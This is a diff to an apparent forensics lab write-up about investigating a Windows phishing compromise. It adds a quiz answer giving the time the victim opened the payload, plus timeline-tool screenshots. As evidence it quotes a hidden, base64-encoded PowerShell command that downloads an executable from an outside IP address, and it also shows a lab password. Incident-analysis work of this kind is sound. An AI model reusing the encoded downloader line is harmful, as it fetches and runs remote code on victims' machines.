@@ -239,7 +239,7 @@ PS C:\Users> ls C:\Users\ ls C:\Users\m.anderson\AppData\Local\Microsoft\Outlook
 <br>
 
 <p>2.2. <em>When did the victim open the malicious payload? (format: MM/DD/YYYY HH:MM:SS)</em><br>
-<code>_____</code></p>
+<code>03/24/2024 19:07:49</code></p>
 
 ![image](https://github.com/user-attachments/assets/b6d87c08-4144-4018-858b-4d98a3825795)
 
@@ -250,12 +250,21 @@ MAnderson03252024!
 ![image](https://github.com/user-attachments/assets/850a48e3-81a8-415b-842e-214a35caf57a)
 
 
-
 ```bash
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -windowstyle hidden -enc aQB3AHIAIAAtAHUAcwBlAGIAIABoAHQAdABwADoALwAvADEAMgA4AC4AMQA5ADkALgAyADQANwAuADEANwAzAC8AYwBvAG4AZgBpAGcAdQByAGUALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgACQAZQBuAHYAOgBhAHAAcAB
 ```
 
+<h3>AppCompatCache</h3>
 
+![image](https://github.com/user-attachments/assets/36af42bf-2868-4ab9-9ff2-f51b44369d5b)
+
+<h3>Timeline Explorer</h3>
+
+![image](https://github.com/user-attachments/assets/8e54c231-8aae-4350-ab2e-f6b4bea8dcf8)
+
+![image](https://github.com/user-attachments/assets/175885ed-1b84-458c-bf48-163106982405)
+
+![image](https://github.com/user-attachments/assets/63415727-bce5-4c4a-958a-dfef2d2af79b)
 
 
 <br>
